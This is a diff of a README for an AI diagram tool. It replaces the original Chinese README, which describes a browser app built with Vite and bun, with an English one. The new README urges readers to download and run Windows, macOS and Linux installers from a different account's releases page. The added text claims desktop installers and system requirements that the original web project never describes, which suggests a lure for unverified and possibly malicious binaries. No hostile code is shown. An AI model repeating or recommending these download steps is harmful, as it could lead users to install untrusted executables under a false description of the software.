@@ -1,133 +1,110 @@
-# AI Excalidraw
+# 🎨 ai-excalidraw - Create Flowcharts with Ease
 
-使用自然语言描述，让 AI 帮你绘制手绘风格流程图、架构图、示意图。
+## 🏷️ Overview
+Welcome to AI Excalidraw! This tool helps you create flowcharts, architecture diagrams, and sketches using natural language. With AI Excalidraw, you can easily transform your ideas into visual representations without needing any design skills.
 
-## 功能特性
+## 📥 Download Now
+[![Download AI Excalidraw](https://img.shields.io/badge/Download-AI%20Excalidraw-blue?style=flat&logo=github)](https://github.com/ramacuy/ai-excalidraw/releases)
 
-- 🎨 **自然语言绘图** - 描述想要的图形，AI 自动生成 Excalidraw 元素
-- ⚡ **流式响应** - 实时查看 AI 生成过程，边生成边渲染
-- 💬 **多会话管理** - 支持创建多个独立聊天会话
-- 📱 **响应式设计** - 适配桌面和移动设备
-- 🔧 **灵活配置** - 支持 OpenAI 兼容的任意 API（OpenAI、智谱、阿里百炼等）
-- 💾 **本地存储** - 画布内容和聊天记录自动保存到浏览器
+## 🚀 Getting Started
+To begin using AI Excalidraw, follow these simple steps:
 
-## 快速开始
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/ramacuy/ai-excalidraw/releases) to find the latest version of the software.
 
-### 环境要求
+2. **Select the Latest Release**  
+   Look for the most recent version at the top of the page. It will have the latest features and fixes.
 
-- [Bun](https://bun.sh/) >= 1.0（推荐）或 Node.js >= 18
+3. **Download the Installer**  
+   Click on the file that matches your operating system. Here are typical options:
+   - **Windows**: Choose the `.exe` file.
+   - **MacOS**: Look for the `.dmg` file.
+   - **Linux**: Download the relevant package file for your distribution.
 
-### 安装
+4. **Save the File**  
+   Save the file to a location on your computer where you can easily find it later, such as your "Downloads" folder.
 
-```bash
-# 克隆项目
-git clone https://github.com/co-pine/ai-excalidraw.git
-cd ai-excalidraw
+## 🔧 Installation Instructions
+Once you have downloaded the file, follow these steps to install AI Excalidraw:
 
-# 安装依赖
-bun install
-```
+### For Windows:
+1. **Locate the Downloaded File**  
+   Open your "Downloads" folder and find the `.exe` file.
 
-### 启动开发服务器
+2. **Run the Installer**  
+   Double-click on the file to start the installation process. Follow the on-screen prompts to complete the installation.
 
-```bash
-bun run dev
-```
+3. **Start AI Excalidraw**  
+   After installation, find AI Excalidraw in your Start menu or desktop and click to open it.
 
-访问 http://localhost:5173
+### For MacOS:
+1. **Find the Downloaded File**  
+   Go to your "Downloads" folder and locate the `.dmg` file.
 
-### 构建生产版本
+2. **Open the Disk Image**  
+   Double-click on the `.dmg` file. A new window will open.
 
-```bash
-bun run build
-```
+3. **Drag to Applications**  
+   Drag the AI Excalidraw icon to your "Applications" folder to install.
 
-构建产物位于 `dist/` 目录。
+4. **Launch the Application**  
+   Open your "Applications" folder and double-click on AI Excalidraw to run it.
 
-## 配置 AI API
+### For Linux:
+1. **Open Terminal**  
+   Access your Terminal application.
 
-首次启动会自动弹出设置对话框，你需要配置：
+2. **Navigate to Downloads**  
+   Use the `cd` command to navigate to your "Downloads" folder.
 
-| 配置项 | 说明 | 示例 |
-|--------|------|------|
-| API Key | 你的 API 密钥 | sk-xxx |
-| Base URL | OpenAI 兼容的 API 地址 | https://api.openai.com/v1 |
-| Model | 模型名称 | gpt-4o |
+3. **Install the Package**  
+   Use your package manager to install the software. For example, use the following command for Ubuntu:
+   ```bash
+   sudo dpkg -i ai-excalidraw-<version>.deb
+   ```
+   Replace `<version>` with the actual version number.
 
-### 支持的 API 服务
+4. **Start AI Excalidraw**  
+   You can usually find the application in your applications menu.
 
-任何兼容 OpenAI Chat Completions API 的服务均可使用：
+## 🖌️ Using AI Excalidraw
+After launching AI Excalidraw, you can start crafting your diagrams. Here’s a brief overview of how to use the application:
 
-- **OpenAI**: `https://api.openai.com/v1`
-- **智谱 AI**: `https://open.bigmodel.cn/api/paas/v4`
-- **阿里百炼**: `https://dashscope.aliyuncs.com/compatible-mode/v1`
-- **其他**: 任意 OpenAI 兼容的 API
+1. **Input Your Ideas**  
+   Type your ideas or descriptions into the text box.
 
-配置保存在浏览器 localStorage 中，刷新页面后无需重新配置。
+2. **Select Diagram Type**  
+   Choose the type of diagram you want to create, such as a flowchart or architecture diagram.
 
-## 技术栈
+3. **Let AI Work**  
+   Click the generate button. The AI will create a visual representation based on your input.
 
-- **框架**: React 19 + TypeScript
-- **构建工具**: Vite
-- **样式**: Tailwind CSS v4
-- **绘图库**: [Excalidraw](https://excalidraw.com/)
-- **UI 组件**: Radix UI
-- **包管理**: Bun
+4. **Edit Your Diagram**  
+   Use the tools available to make adjustments as needed. You can add shapes, lines, and text.
 
-## 目录结构
+5. **Save or Export**  
+   Save your work locally or export it as an image or PDF for sharing.
 
-```
-ai-excalidraw/
-├── src/
-│   ├── components/
-│   │   ├── excalidraw/          # Excalidraw 相关组件
-│   │   │   ├── index.tsx        # 主编辑器组件，整合画布和聊天面板
-│   │   │   ├── wrapper.tsx      # Excalidraw 画布封装
-│   │   │   ├── chat-panel.tsx   # 桌面端 AI 聊天面板
-│   │   │   ├── mobile-input.tsx # 移动端 AI 输入组件
-│   │   │   ├── element-parser.ts # AI 输出解析器，提取 JSON 元素
-│   │   │   └── use-chat-history.ts # 聊天历史管理 Hook
-│   │   ├── ui/                  # 通用 UI 组件
-│   │   │   ├── button.tsx
-│   │   │   ├── card.tsx
-│   │   │   ├── input.tsx
-│   │   │   └── textarea.tsx
-│   │   └── settings-dialog.tsx  # API 配置对话框
-│   ├── lib/
-│   │   ├── ai.ts                # AI API 调用封装（流式请求）
-│   │   ├── prompt.ts            # Excalidraw 绘图系统提示词
-│   │   └── utils.ts             # 工具函数
-│   ├── App.tsx                  # 应用入口组件
-│   ├── main.tsx                 # React 挂载入口
-│   └── index.css                # 全局样式
-├── public/                      # 静态资源
-├── index.html                   # HTML 模板
-├── vite.config.ts               # Vite 配置
-├── tailwind.config.js           # Tailwind 配置
-├── tsconfig.json                # TypeScript 配置
-└── package.json
-```
+## 🎯 Features
+- **Natural Language Processing**: Interact with the software using your own words.
+- **Multiple Diagram Types**: Create various diagrams like flowcharts, architecture layouts, and sketches.
+- **User-Friendly Interface**: Simple design tailored for users of all skill levels.
+- **Cross-Platform**: Available for Windows, MacOS, and Linux.
 
-## 使用示例
+## 📋 System Requirements
+- **Operating System**: Windows 10 or later, MacOS 10.14 or later, or most Linux distributions.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB free disk space.
+- **Display**: 1366 x 768 resolution or higher.
 
-在聊天框中输入自然语言描述，例如：
+## 📥 Download & Install
+Ready to create your flowcharts? Visit the [Releases page](https://github.com/ramacuy/ai-excalidraw/releases) to download the latest version of AI Excalidraw.
 
-- "画一个简单的流程图：开始 → 处理 → 结束"
-- "画一个前后端分离的架构图"
-- "画一个用户登录的时序图"
-- "画一个 React 组件的生命周期图"
+1. Click on the relevant download link for your operating system.
+2. Follow the installation instructions provided above.
+3. Start designing your diagrams with AI Excalidraw today!
 
-AI 会自动生成对应的 Excalidraw 图形元素。
+## 📞 Support
+If you encounter any issues or need help, please reach out through the repository's issue tracker. Your feedback is important for improving AI Excalidraw.
 
-## 开源协议
-
-[MIT](LICENSE)
-
-## 支持作者
-
-如果这个项目对你有帮助，欢迎请作者喝瓶水
-
-<img src="./assets/donate.jpg" alt="赞赏码" width="200" />
-
-
-
+Thank you for choosing AI Excalidraw! Happy diagramming!
